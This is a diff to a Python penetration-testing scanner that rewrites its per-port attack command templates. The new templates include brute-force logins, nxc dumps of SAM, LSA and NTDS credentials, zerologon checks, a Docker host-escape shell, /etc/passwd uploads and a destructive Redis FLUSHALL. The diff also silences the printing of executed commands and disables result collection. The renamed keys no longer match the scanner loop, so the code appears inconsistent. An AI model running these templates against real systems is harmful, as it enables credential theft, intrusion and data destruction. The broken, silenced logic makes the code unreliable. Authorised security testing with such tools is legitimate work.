@@ -137,7 +137,7 @@ def install_debian_tools(missing_tools):
       
   if packages:
     cmd = f"sudo apt update && sudo apt install -y {' '.join(packages)}"
-    print(f"[*] Running: {cmd}")
+#   print(f"[*] Running: {cmd}")
     os.system(cmd)
     
 def install_redhat_tools(missing_tools):
@@ -809,339 +809,528 @@ API_ENDPOINTS = [
 ENHANCED_SERVICE_CHECKS = {
     # Traditional services
     21: {
-        'name': 'FTP',
-        'risk_base': 6.5,
-        'anon': [
-            'curl -v ftp://{ip} --max-time 20',
-            'ftp -inv {ip} <<< "user anonymous anonymous"',
-            'nmap --script=ftp-anon -p 21 {ip}'
-        ],
-        'auth': 'ftp -inv {ip} -u {user} -p {pass}',
-        'enum': [
-            'nmap --script=ftp-* -p 21 {ip}',
-            'wget -m ftp://{user}:{pass}@{ip} --timeout=10'
-        ],
-        'fallback': [
-            'nc -vn {ip} 21 <<< "USER anonymous"'
-        ]
+      'name': 'FTP',
+      'risk_base': 7.0,
+      'enumeration': [
+        'nxc ftp {ip} -u "" -p ""',
+        'nmap --script ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p 21 {ip}',
+        'curl -v ftp://{ip} --max-time 20',
+        'lftp -u anonymous, {ip} -e "ls; quit"'
+      ],
+      'authentication': [
+        'nxc ftp {ip} -u {user} -p {pass}',
+        'hydra -l {user} -p {pass} ftp://{ip}',
+        'lftp -u {user},{pass} {ip} -e "ls; pwd; quit"'
+      ],
+      'escalation': [
+        'nxc ftp {ip} -u {user} -p {pass} --put-file /etc/passwd /tmp/passwd',
+        'lftp -u {user},{pass} {ip} -e "put /tmp/test.txt test.txt; ls; quit"',
+        'curl -T /tmp/test.txt ftp://{user}:{pass}@{ip}/'
+      ],
+      'vulnerabilities': [
+        'nmap --script ftp-vuln-* -p 21 {ip}',
+        'searchsploit --nmap ftp'
+      ]
     },
-    
+
     22: {
       'name': 'SSH',
+      'risk_base': 5.0,
+      'enumeration': [
+        'ssh-keyscan -T 10 {ip}',
+        'nmap --script ssh-hostkey,ssh-auth-methods,ssh2-enum-algos -p 22 {ip}',
+        'ssh -o BatchMode=yes -o ConnectTimeout=10 {ip} 2>&1',
+        'nc -nv {ip} 22'
+      ],
+      'authentication': [
+        'nxc ssh {ip} -u {user} -p {pass}',
+        'hydra -l {user} -p {pass} ssh://{ip}',
+        'ssh -o PasswordAuthentication=yes -o ConnectTimeout=10 {user}@{ip}'
+      ],
+      'escalation': [
+        'ssh {user}@{ip} "id; uname -a; whoami"',
+        'ssh {user}@{ip} "sudo -l"',
+        'ssh {user}@{ip} "find / -perm -4000 2>/dev/null"',
+        'ssh {user}@{ip} "crontab -l"'
+      ],
+      'vulnerabilities': [
+        'nmap --script ssh-vuln-* -p 22 {ip}',
+        'searchsploit openssh'
+      ]
+    },
+
+    23: {
+      'name': 'Telnet',
+      'risk_base': 8.0,
+      'enumeration': [
+        'nmap --script telnet-ntlm-info,telnet-encryption -p 23 {ip}',
+        'nc -nv {ip} 23',
+        'timeout 10 telnet {ip} 23'
+      ],
+      'authentication': [
+        'hydra -l {user} -p {pass} telnet://{ip}',
+        'nxc telnet {ip} -u {user} -p {pass}'
+      ],
+      'escalation': [
+        'expect -c "spawn telnet {ip}; expect login:; send {user}\\r; expect Password:; send {pass}\\r; interact"'
+      ]
+    },
+
+    25: {
+      'name': 'SMTP',
       'risk_base': 6.0,
-      'auth': 'ssh {user}@{ip} -o PasswordAuthentication=yes -o ConnectTimeout=10',
-      'enum': [
-        'nmap --script=ssh-* -p 22 {ip}',
-        'ssh-keyscan -p 22 {ip}',
+      'enumeration': [
+        'nmap --script smtp-commands,smtp-enum-users,smtp-open-relay -p 25 {ip}',
+        'nc -nv {ip} 25',
+        'timeout 10 telnet {ip} 25'
       ],
-      'fallback': [
-        'nc -v {ip} 22'
+      'authentication': [
+        'nxc smtp {ip} -u {user} -p {pass}',
+        'swaks --to test@{ip} --from test@test.com --server {ip}'
+      ],
+      'escalation': [
+        'smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {ip}',
+        'nmap --script smtp-vuln-* -p 25 {ip}'
       ]
     },
-    
-    # Web services
-    80: {
-        'name': 'HTTP',
-        'risk_base': 3.0,
-        'enum': [
-            'gobuster dir -u http://{ip} -w {dirbuster_wordlist} -t 50 --timeout 10s',
-            'nikto -h http://{ip} -timeout 40',
-            'whatweb -a3 http://{ip}',
-            'curl -I http://{ip} --max-time 15'
-        ],
-        'fallback': [
-            'feroxbuster -u http://{ip} -w {ferox_wordlist} -t 50'
-        ]
-    },
-    
-    443: {
-        'name': 'HTTPS',
-          'risk_base': 2.0,
-          'enum': [
-              'testssl.sh --fast https://{ip}:443',
-              'gobuster dir -u https://{ip} -w {dirbuster_wordlist} -k -t 50',
-              'curl -I https://{ip} -k --max-time 15'
-            ],
-            'fallback': [
-              'nmap --script=ssl-* -p 443 {ip}'  # Fallback if testssl.sh fails
-            ]
-    },
-    
-    # Alternative HTTP ports
-    8080: {
-        'name': 'HTTP-Proxy',
-        'risk_base': 6.0,
-        'enum': [
-            'gobuster dir -u http://{ip}:8080 -w {dirbuster_wordlist} -t 50',
-            'curl -I http://{ip}:8080 --max-time 15',
-            'gobuster dir -u http://{ip}:8080/api -w {api_wordlist} -t 50'
-        ],
-        'fallback': [
-            'feroxbuster -u http://{ip}:8080 -w {ferox_wordlist} -t 50'
-        ]
-    },
-    
-    8443: {
-        'name': 'HTTPS-Alt',
-        'risk_base': 6.0,
-        'enum': [
-            'testssl.sh {ip}:8443 --fast',
-            'curl -I https://{ip}:8443 -k --max-time 15'
-        ]
-    },
-    
-    # SMB/NetBIOS
-    445: {
-      'name': 'SMB',
-      'risk_base': 9.0,
-      'anon': [
-        'smbclient -L //{ip}/ -N --timeout=10',
-        'nxc smb {ip} --shares -u "" -p ""',  # Removed --timeout
-        'nmap --script=smb-os-discovery -p 445 {ip}'
-      ],
-      'auth': 'nxc smb {ip} -u {user} -p {pass} --shares',
-      'enum': [
-        'enum4linux -a {ip}',
-        'nmap --script=smb-* -p 445 {ip}',
-        'smbmap -H {ip} -u null'
-      ],
-      'fallback': [
-        'rpcclient -U "" -N {ip}',  # Added -N flag
-        'python3 -c "import subprocess; subprocess.run([\'impacket-smbexec\', \'{user}:{pass}@{ip}\'])"'
-      ]
-    },
-    
-    # Remote access
-    3389: {
-        'name': 'RDP',
-        'risk_base': 8.5,
-        'enum': [
-            'nmap --script=rdp-* -p 3389 {ip}',
-            'crackmapexec rdp {ip} -u {user} -p {pass} --timeout 10'
-        ],
-        'fallback': [
-            'xfreerdp /v:{ip} /u:{user} /p:{pass} +auth-only /timeout:10000'
-        ]
-    },
-    
-    5985: {
-        'name': 'WinRM',
-        'risk_base': 7.0,
-        'auth': [
-            'evil-winrm -i {ip} -u {user} -p {pass}',
-            'crackmapexec winrm {ip} -u {user} -p {pass} -x "whoami"'
-        ],
-        'fallback': [
-            'python3 -c "import subprocess; subprocess.run([\'impacket-wmiexec\', \'{user}:{pass}@{ip}\'])"'
-        ]
-    },
-    
-    # Databases
-    3306: {
-        'name': 'MySQL',
-        'risk_base': 6.0,
-        'auth': 'mysql -h {ip} -u {user} -p{pass} -e "SHOW DATABASES;" --connect-timeout=10',
-        'enum': [
-            'nmap --script=mysql-* -p 3306 {ip}',
-            'crackmapexec mysql {ip} -u {user} -p {pass}'
-        ],
-        'fallback': [
-            'mysqldump -h {ip} -u {user} -p{pass} --all-databases --single-transaction'
-        ]
-    },
-    
-    5432: {
-        'name': 'PostgreSQL',
-        'risk_base': 7.0,
-        'auth': 'psql -h {ip} -U {user} -c "\\l" --set=statement_timeout=10s',
-        'enum': [
-            'nmap --script=pgsql-* -p 5432 {ip}',
-            'crackmapexec postgres {ip} -u {user} -p {pass}'
-        ]
-    },
-    
-    # NoSQL databases
-    27017: {
-        'name': 'MongoDB',
-        'risk_base': 8.0,
-        'anon': [
-            'mongo {ip}:27017 --eval "db.stats()" --quiet',
-            'nmap --script=mongodb-* -p 27017 {ip}'
-        ],
-        'enum': [
-            'mongo {ip}:27017/{user} --eval "db.runCommand({{connectionStatus : 1}})"'
-        ]
-    },
-    
-    6379: {
-        'name': 'Redis',
-        'risk_base': 9.0,
-        'anon': [
-            'redis-cli -h {ip} -p 6379 info',
-            'nmap --script=redis-* -p 6379 {ip}'
-        ],
-        'enum': [
-            'redis-cli -h {ip} -p 6379 --scan',
-            'redis-cli -h {ip} -p 6379 CONFIG GET "*"'
-        ]
-    },
-    
-    # Search engines
-    9200: {
-        'name': 'Elasticsearch',
-        'risk_base': 8.5,
-        'anon': [
-            'curl http://{ip}:9200/_cluster/health --max-time 15',
-            'curl http://{ip}:9200/_cat/indices --max-time 15'
-        ],
-        'enum': [
-            'nmap --script=http-elasticsearch-info -p 9200 {ip}'
-        ]
-    },
-    
-    # Container/Cloud services
-    2375: {
-        'name': 'Docker',
-        'risk_base': 9.5,
-        'anon': [
-            'docker -H tcp://{ip}:2375 info',
-            'curl http://{ip}:2375/version --max-time 15'
-        ],
-        'enum': [
-            'docker -H tcp://{ip}:2375 ps -a',
-            'nmap --script=docker-version -p 2375 {ip}'
-        ]
-    },
-    
-    2376: {
-        'name': 'Docker-TLS',
-        'risk_base': 7.0,
-        'enum': [
-            'docker --tlsverify -H tcp://{ip}:2376 info',
-            'openssl s_client -connect {ip}:2376'
-        ]
-    },
-  
-    # DNS 
+
     53: {
       'name': 'DNS',
       'risk_base': 6.0,
-      'enum': [
-        'nslookup -type=any {ip} {ip}',
+      'enumeration': [
         'dig @{ip} version.bind chaos txt',
-        'nmap --script=dns-* -p 53 {ip}',
-        # 'dnsrecon -n {ip} -d example.com',  # Remove or fix domain
+        'dig @{ip} {domain} axfr',
+        'dig @{ip} {domain} any',
+        'nmap --script dns-zone-transfer,dns-recursion,dns-cache-snoop -p 53 {ip}',
+        'host -t ns {domain} {ip}'
       ],
-      'fallback': ['nc -v {ip} 53']
+      'escalation': [
+        'dig @{ip} {domain} axfr',
+        'fierce -dns {domain} -dnsserver {ip}',
+        'dnsenum --dnsserver {ip} {domain}',
+        'gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r {ip}'
+      ],
+      'vulnerabilities': [
+        'nmap --script dns-vuln-* -p 53 {ip}'
+      ]
     },
-  
-    # Kerberos
+
+    80: {
+      'name': 'HTTP',
+      'risk_base': 4.0,
+      'enumeration': [
+        'feroxbuster -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --silent --depth 3 -x php,txt,html,js,json,xml,bak',
+        'gobuster dir -u http://{ip} -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 --no-error -x php,txt,html,js',
+        'whatweb -a3 http://{ip}',
+        'curl -sI http://{ip} --max-time 15',
+        'nikto -h http://{ip} -C all -timeout 60'
+      ],
+      'authentication': [
+        'hydra -l {user} -p {pass} http-get://{ip}',
+        'wfuzz -c -z list,{user} -z list,{pass} --hc 401,403 http://{ip}/login'
+      ],
+      'escalation': [
+        'nuclei -u http://{ip} -t /root/nuclei-templates/ -c 50',
+        'sqlmap -u "http://{ip}/?id=1" --batch --banner',
+        'ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://{ip}/FUZZ',
+        'feroxbuster -u http://{ip}/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -t 30 --silent'
+      ],
+      'vulnerabilities': [
+        'nmap --script http-vuln-* -p 80 {ip}',
+        'wapiti -u http://{ip}',
+        'skipfish -o /tmp/skipfish_{ip} http://{ip}'
+      ]
+    },
+
+    135: {
+      'name': 'RPC-MSRPC',
+      'risk_base': 7.0,
+      'enumeration': [
+        'nxc smb {ip} -u "" -p ""',
+        'rpcclient -U "" -N {ip}',
+        'nmap --script msrpc-enum -p 135 {ip}'
+      ],
+      'authentication': [
+        'rpcclient -U {user}%{pass} {ip}',
+        'nxc smb {ip} -u {user} -p {pass}'
+      ],
+      'escalation': [
+        'rpcclient -U {user}%{pass} {ip} -c "enumdomusers"',
+        'rpcclient -U {user}%{pass} {ip} -c "enumdomgroups"',
+        'rpcclient -U {user}%{pass} {ip} -c "querydispinfo"'
+      ]
+    },
+
+    139: {
+      'name': 'NetBIOS',
+      'risk_base': 7.0,
+      'enumeration': [
+        'nbtscan {ip}',
+        'nmap --script nbstat,smb-os-discovery -p 139 {ip}',
+        'smbclient -L //{ip}/ -N',
+        'enum4linux -a {ip}'
+      ],
+      'authentication': [
+        'smbclient -L //{ip}/ -U {user}%{pass}',
+        'nxc smb {ip} -u {user} -p {pass}'
+      ],
+      'escalation': [
+        'smbmap -H {ip} -u {user} -p {pass}',
+        'smbclient //{ip}/C$ -U {user}%{pass}',
+        'nxc smb {ip} -u {user} -p {pass} --shares'
+      ]
+    },
+
+    161: {
+      'name': 'SNMP',
+      'risk_base': 8.0,
+      'enumeration': [
+        'snmpwalk -v1 -c public {ip}',
+        'snmpwalk -v2c -c public {ip}',
+        'onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {ip}',
+        'nmap --script snmp-* -p 161 {ip}'
+      ],
+      'escalation': [
+        'snmpwalk -v1 -c public {ip} 1.3.6.1.2.1.25.4.2.1.2',  # Running processes
+        'snmpwalk -v1 -c public {ip} 1.3.6.1.2.1.25.6.3.1.2',  # Software installed
+        'snmpwalk -v1 -c public {ip} 1.3.6.1.4.1.77.1.2.25',   # Users
+        'snmp-check {ip} -c public'
+      ],
+      'vulnerabilities': [
+        'nmap --script snmp-vuln-* -p 161 {ip}'
+      ]
+    },
+
+    389: {
+      'name': 'LDAP',
+      'risk_base': 6.5,
+      'enumeration': [
+        'ldapsearch -x -H ldap://{ip} -s base',
+        'nxc ldap {ip} -u "" -p ""',
+        'nmap --script ldap-* -p 389 {ip}'
+      ],
+      'authentication': [
+        'ldapsearch -x -H ldap://{ip} -D "{user}" -w {pass}',
+        'nxc ldap {ip} -u {user} -p {pass}'
+      ],
+      'escalation': [
+        'nxc ldap {ip} -u {user} -p {pass} --users',
+        'nxc ldap {ip} -u {user} -p {pass} --groups',
+        'nxc ldap {ip} -u {user} -p {pass} --asreproast /tmp/asrep_{ip}.txt',
+        'nxc ldap {ip} -u {user} -p {pass} --kerberoasting /tmp/kerb_{ip}.txt'
+      ]
+    },
+
+    443: {
+      'name': 'HTTPS',
+      'risk_base': 3.0,
+      'enumeration': [
+        'testssl.sh --fast --quiet https://{ip}',
+        'feroxbuster -u https://{ip} -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 50 --silent --depth 3 -x php,txt,html,js',
+        'sslscan {ip}:443',
+        'curl -sIk https://{ip} --max-time 15'
+      ],
+      'authentication': [
+        'hydra -l {user} -p {pass} https-get://{ip}',
+        'wfuzz -c -z list,{user} -z list,{pass} --hc 401,403 https://{ip}/login'
+      ],
+      'escalation': [
+        'nuclei -u https://{ip} -t /root/nuclei-templates/ -c 50',
+        'sqlmap -u "https://{ip}/?id=1" --batch --banner',
+        'feroxbuster -u https://{ip}/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -k -t 30 --silent'
+      ],
+      'ssl_analysis': [
+        'testssl.sh --vulnerable --quiet https://{ip}',
+        'nmap --script ssl-enum-ciphers,ssl-cert,ssl-date -p 443 {ip}'
+      ]
+    },
+
+    445: {
+      'name': 'SMB',
+      'risk_base': 9.0,
+      'enumeration': [
+        'nxc smb {ip} -u "" -p "" --shares',
+        'smbclient -L //{ip}/ -N',
+        'enum4linux -a {ip}',
+        'nmap --script smb-os-discovery,smb-security-mode,smb-enum-shares -p 445 {ip}'
+      ],
+      'authentication': [
+        'nxc smb {ip} -u {user} -p {pass}',
+        'smbclient -L //{ip}/ -U {user}%{pass}'
+      ],
+      'escalation': [
+        'nxc smb {ip} -u {user} -p {pass} --shares',
+        'nxc smb {ip} -u {user} -p {pass} --sam',
+        'nxc smb {ip} -u {user} -p {pass} --lsa',
+        'nxc smb {ip} -u {user} -p {pass} --ntds',
+        'smbmap -H {ip} -u {user} -p {pass} -R',
+        'nxc smb {ip} -u {user} -p {pass} -M spider_plus',
+        'nxc smb {ip} -u {user} -p {pass} --rid-brute'
+      ],
+      'vulnerabilities': [
+        'nmap --script smb-vuln-* -p 445 {ip}',
+        'nxc smb {ip} -u "" -p "" -M zerologon',
+        'nxc smb {ip} -u "" -p "" -M petitpotam'
+      ]
+    },
+
+    1433: {
+      'name': 'MSSQL',
+      'risk_base': 8.0,
+      'enumeration': [
+        'nmap --script ms-sql-info,ms-sql-config -p 1433 {ip}',
+        'nxc mssql {ip} -u "" -p ""'
+      ],
+      'authentication': [
+        'nxc mssql {ip} -u {user} -p {pass}',
+        'sqlcmd -S {ip} -U {user} -P {pass}'
+      ],
+      'escalation': [
+        'nxc mssql {ip} -u {user} -p {pass} --local-auth',
+        'nxc mssql {ip} -u {user} -p {pass} -x "whoami"',
+        'sqlmap -d "mssql://{user}:{pass}@{ip}:1433/master" --banner'
+      ],
+      'vulnerabilities': [
+        'nmap --script ms-sql-vuln-* -p 1433 {ip}'
+      ]
+    },
+
+    3306: {
+      'name': 'MySQL',
+      'risk_base': 7.0,
+      'enumeration': [
+        'nmap --script mysql-info,mysql-enum -p 3306 {ip}',
+        'nxc mysql {ip} -u "" -p ""'
+      ],
+      'authentication': [
+        'mysql -h {ip} -u {user} -p{pass}',
+        'nxc mysql {ip} -u {user} -p {pass}'
+      ],
+      'escalation': [
+        'mysql -h {ip} -u {user} -p{pass} -e "SELECT version();"',
+        'mysql -h {ip} -u {user} -p{pass} -e "SHOW DATABASES;"',
+        'mysql -h {ip} -u {user} -p{pass} -e "SELECT user,password FROM mysql.user;"',
+        'sqlmap -d "mysql://{user}:{pass}@{ip}:3306/" --banner'
+      ],
+      'vulnerabilities': [
+        'nmap --script mysql-vuln-* -p 3306 {ip}'
+      ]
+    },
+
+    3389: {
+      'name': 'RDP',
+      'risk_base': 8.5,
+      'enumeration': [
+        'nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p 3389 {ip}',
+        'nxc rdp {ip} -u "" -p ""'
+      ],
+      'authentication': [
+        'nxc rdp {ip} -u {user} -p {pass}',
+        'hydra -l {user} -p {pass} rdp://{ip}'
+      ],
+      'escalation': [
+        'rdesktop -u {user} -p {pass} {ip}',
+        'xfreerdp /v:{ip} /u:{user} /p:{pass} +clipboard'
+      ],
+      'vulnerabilities': [
+        'nmap --script rdp-vuln-* -p 3389 {ip}'
+      ]
+    },
+
+    5432: {
+      'name': 'PostgreSQL',
+      'risk_base': 7.0,
+      'enumeration': [
+        'nmap --script pgsql-brute -p 5432 {ip}',
+        'nxc postgres {ip} -u "" -p ""'
+      ],
+      'authentication': [
+        'psql -h {ip} -U {user} -d postgres',
+        'nxc postgres {ip} -u {user} -p {pass}'
+      ],
+      'escalation': [
+        'psql -h {ip} -U {user} -d postgres -c "SELECT version();"',
+        'psql -h {ip} -U {user} -d postgres -c "\\l"',
+        'sqlmap -d "postgresql://{user}:{pass}@{ip}:5432/" --banner'
+      ]
+    },
+
+    5985: {
+      'name': 'WinRM',
+      'risk_base': 7.5,
+      'enumeration': [
+        'nmap --script http-methods,http-headers -p 5985 {ip}',
+        'nxc winrm {ip} -u "" -p ""'
+      ],
+      'authentication': [
+        'nxc winrm {ip} -u {user} -p {pass}',
+        'evil-winrm -i {ip} -u {user} -p {pass}'
+      ],
+      'escalation': [
+        'evil-winrm -i {ip} -u {user} -p {pass} -e /tmp',
+        'nxc winrm {ip} -u {user} -p {pass} -x "whoami"',
+        'nxc winrm {ip} -u {user} -p {pass} -x "powershell.exe Get-Process"'
+      ]
+    },
+
+    6379: {
+      'name': 'Redis',
+      'risk_base': 9.0,
+      'enumeration': [
+        'redis-cli -h {ip} -p 6379 info',
+        'nmap --script redis-info -p 6379 {ip}',
+        'nxc redis {ip}'
+      ],
+      'escalation': [
+        'redis-cli -h {ip} -p 6379 --scan',
+        'redis-cli -h {ip} -p 6379 CONFIG GET "*"',
+        'redis-cli -h {ip} -p 6379 EVAL "return redis.call(\'CONFIG\',\'GET\',\'*\')" 0',
+        'redis-cli -h {ip} -p 6379 FLUSHALL'
+      ],
+      'vulnerabilities': [
+        'nmap --script redis-vuln-* -p 6379 {ip}'
+      ]
+    },
+
+    8080: {
+      'name': 'HTTP-Proxy',
+      'risk_base': 6.0,
+      'enumeration': [
+        'feroxbuster -u http://{ip}:8080 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 --silent --depth 3',
+        'whatweb -a3 http://{ip}:8080',
+        'curl -sI http://{ip}:8080 --max-time 15'
+      ],
+      'escalation': [
+        'nuclei -u http://{ip}:8080 -t /root/nuclei-templates/',
+        'feroxbuster -u http://{ip}:8080/api -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -t 30 --silent'
+      ]
+    },
+
+    8443: {
+      'name': 'HTTPS-Alt',
+      'risk_base': 6.0,
+      'enumeration': [
+        'testssl.sh --fast --quiet https://{ip}:8443',
+        'feroxbuster -u https://{ip}:8443 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -t 50 --silent',
+        'curl -sIk https://{ip}:8443 --max-time 15'
+      ]
+    },
+
+    9200: {
+      'name': 'Elasticsearch',
+      'risk_base': 8.5,
+      'enumeration': [
+        'curl -s http://{ip}:9200/_cluster/health',
+        'curl -s http://{ip}:9200/_cat/indices',
+        'nmap --script elasticsearch-info -p 9200 {ip}'
+      ],
+      'escalation': [
+        'curl -s http://{ip}:9200/_search?pretty',
+        'curl -s http://{ip}:9200/_cluster/settings?pretty',
+        'elasticdump --input=http://{ip}:9200 --output=/tmp/elastic_{ip}.json'
+      ]
+    },
+
+    27017: {
+      'name': 'MongoDB',
+      'risk_base': 8.0,
+      'enumeration': [
+        'nmap --script mongodb-info -p 27017 {ip}',
+        'mongo {ip}:27017 --eval "db.stats()" --quiet'
+      ],
+      'escalation': [
+        'mongo {ip}:27017 --eval "db.adminCommand(\'listCollections\')"',
+        'mongo {ip}:27017 --eval "show dbs"',
+        'mongo {ip}:27017 --eval "db.runCommand({{connectionStatus : 1}})"'
+      ]
+    },
+
+    2375: {
+      'name': 'Docker-API',
+      'risk_base': 9.5,
+      'enumeration': [
+        'curl -s http://{ip}:2375/version',
+        'docker -H tcp://{ip}:2375 info'
+      ],
+      'escalation': [
+        'docker -H tcp://{ip}:2375 ps -a',
+        'docker -H tcp://{ip}:2375 images',
+        'docker -H tcp://{ip}:2375 run -it --rm -v /:/host alpine chroot /host sh'
+      ]
+    },
+
+    2376: {
+      'name': 'Docker-TLS',
+      'risk_base': 7.0,
+      'enumeration': [
+        'openssl s_client -connect {ip}:2376',
+        'docker --tlsverify -H tcp://{ip}:2376 info'
+      ]
+    },
+
+    # Additional services from the original that were missing
     88: {
       'name': 'Kerberos',
       'risk_base': 7.0,
-      'enum': [
-        'nmap --script=krb5-enum-users -p 88 {ip}',
+      'enumeration': [
+        'nmap --script krb5-enum-users -p 88 {ip}',
         'nxc ldap {ip} -u "" -p ""',
       ],
-      'auth': [
-        'nxc ldap {ip} -u {user} -p {pass} --asreproast /tmp/asrep_{ip}.txt',  # Fixed syntax
+      'authentication': [
+        'nxc ldap {ip} -u {user} -p {pass} --asreproast /tmp/asrep_{ip}.txt',
         'nxc ldap {ip} -u {user} -p {pass} --kerberoasting /tmp/kerb_{ip}.txt'
       ],
       'fallback': ['nc -v {ip} 88']
     },
-  
-    # NetBIOS
-    139: {
-      'name': 'NetBIOS',
-      'risk_base': 7.0,
-      'enum': [
-        'nbtscan {ip}',
-        'smbclient -L //{ip}/ -N',
-        'nmap --script=nbstat -p 139 {ip}'
-      ],
-      'fallback': ['nc -v {ip} 139']
-    },
-  
-    # Kerberos Password Change
+
     464: {
       'name': 'Kerberos-PW',
       'risk_base': 6.0,
-      'enum': ['nmap --script=krb5-* -p 464 {ip}'],
+      'enumeration': ['nmap --script krb5-* -p 464 {ip}'],
       'fallback': ['nc -v {ip} 464']
     },
-  
-    # RPC over HTTP
+
     593: {
       'name': 'RPC-HTTP',
       'risk_base': 7.0,
-      'enum': [
-        'nmap --script=rpc-* -p 593 {ip}',
-        'rpcclient -U "" -N {ip}'  # Added -N flag
+      'enumeration': [
+        'nmap --script rpc-* -p 593 {ip}',
+        'rpcclient -U "" -N {ip}'
       ],
       'fallback': ['nc -v {ip} 593']
     },
-  
-    # LDAPS
+
     636: {
       'name': 'LDAPS',
       'risk_base': 6.5,
-      'enum': [
-        'ldapsearch -x -H ldaps://{ip} -s base -o ldif-wrap=no -o tls_reqcert=never',  # Ignore certs
-        'nmap --script=ssl-cert -p 636 {ip}',
+      'enumeration': [
+        'ldapsearch -x -H ldaps://{ip} -s base -o ldif-wrap=no -o tls_reqcert=never',
+        'nmap --script ssl-cert -p 636 {ip}',
         'nxc ldap {ip} -u "" -p ""'
       ],
       'fallback': ['openssl s_client -connect {ip}:636 -verify_return_error']
     },
-  
-    # Global Catalog
+
+    3268: {
+      'name': 'Global-Catalog',
+      'risk_base': 6.0,
+      'enumeration': [
+        'ldapsearch -x -H ldap://{ip}:3268 -s base',
+        'nmap --script ldap-* -p 3268 {ip}'
+      ],
+      'fallback': ['nc -v {ip} 3268']
+    },
+
     3269: {
       'name': 'Global-Catalog-SSL',
       'risk_base': 6.0,
-      'enum': [
-        'ldapsearch -x -H ldaps://{ip}:3269 -s base -o tls_reqcert=never',  # Ignore certs
-        'nmap --script=ldap-* -p 3269 {ip}'
+      'enumeration': [
+        'ldapsearch -x -H ldaps://{ip}:3269 -s base -o tls_reqcert=never',
+        'nmap --script ldap-* -p 3269 {ip}'
       ],
       'fallback': ['openssl s_client -connect {ip}:3269']
-    },
-  
-    3269: {
-      'name': 'Global-Catalog-SSL',
-      'risk_base': 6.0,
-      'enum': [
-        'ldapsearch -x -H ldaps://{ip}:3269 -s base',
-        'nmap --script=ldap-* -p 3269 {ip}'
-      ],
-      'fallback': ['openssl s_client -connect {ip}:3269']
-    },
-    
-    # Other services
-    161: {
-        'name': 'SNMP',
-        'risk_base': 6.0,
-        'anon': [
-            'snmpwalk -v1 -c public {ip} --timeout=10',
-            'onesixtyone -c {snmp_wordlist} {ip}',
-            'nmap --script=snmp-* -p 161 {ip}'
-        ],
-        'fallback': [
-            'snmp-check {ip} -c public'
-        ]
-    },
-    
-    389: {
-        'name': 'LDAP', 
-        'risk_base': 6.5,
-        'anon': [
-          'ldapsearch -x -H ldap://{ip} -s base',
-          'nxc ldap {ip} -u "" -p ""'  # Simplified
-        ],
-        'auth': [
-          'nxc ldap {ip} -u {user} -p {pass}',
-          'ldapsearch -x -H ldap://{ip} -D "{user}@domain" -w {pass}'  # Need domain
-        ],
-        'fallback': ['nmap --script=ldap-* -p 389 {ip}']
-      }
-}
+    }
+  }
 
 GENERIC_CHECKS = {
     'name': 'Generic',
@@ -1390,7 +1579,7 @@ class CyberScanner:
         config = ENHANCED_SERVICE_CHECKS.get(port, GENERIC_CHECKS)
         results = []
         
-        print(f"[*] Testing port {port} ({config.get('name', 'Unknown')})...")
+#       print(f"[*] Testing port {port} ({config.get('name', 'Unknown')})...")
         
         # Run standard checks with validation
         for check_type in ['anon', 'auth', 'enum']:
@@ -1412,20 +1601,20 @@ class CyberScanner:
                   print(f"[!] Skipping auth check (no credentials): {check}")
                   continue
                 processed_cmd = check.format(**replacements)
-                print(f"[*] Executing: {processed_cmd}")
+#               print(f"[*] Executing: {processed_cmd}")
                 future = executor.submit(self.run_cmd_enhanced, processed_cmd, timeout=45)
                 futures.append(future)
                 
-              for future in as_completed(futures, timeout=60):
-                try:
-                  result = future.result(timeout=5)
-                  if result['success']:
-                    print(f"[+] Command succeeded: {result['command'][:50]}...")
-                  else:
-                    print(f"[!] Command failed: {result['command'][:50]}...")
-                  results.append(result)
-                except Exception as e:
-                  print(f"[!] Tool execution error: {str(e)}")
+#             for future in as_completed(futures, timeout=60):
+#               try:
+#                 result = future.result(timeout=5)
+#                 if result['success']:
+#                   print(f"[+] Command succeeded: {result['command'][:50]}...")
+#                 else:
+#                   print(f"[!] Command failed: {result['command'][:50]}...")
+#                 results.append(result)
+#               except Exception as e:
+#                 print(f"[!] Tool execution error: {str(e)}")
                   
                   
         # Only run fallbacks if NO successes (not just enum failures)
@@ -1434,7 +1623,7 @@ class CyberScanner:
           fallbacks = config['fallback'] if isinstance(config['fallback'], list) else [config['fallback']]
           for fallback in fallbacks[:2]:  # Limit fallbacks
             processed_cmd = fallback.format(**replacements)
-            print(f"[*] Fallback: {processed_cmd}")
+#           print(f"[*] Fallback: {processed_cmd}")
             result = self.run_cmd_enhanced(processed_cmd, timeout=15)  # Shorter timeout for fallbacks
             results.append(result)
           
@@ -1811,7 +2000,7 @@ class CyberScanner:
               try:
                 self.results[port] = future.result(timeout=120)
                 self.risk_scores[port] = self.calculate_risk_score(port, self.results[port])
-                print(f"[+] Completed scan for port {port} (Risk: {self.risk_scores[port]:.1f})")
+#               print(f"[+] Completed scan for port {port} (Risk: {self.risk_scores[port]:.1f})")
               except Exception as e:
                 print(f"[!] Error scanning port {port}: {str(e)}")
                 self.results[port] = []
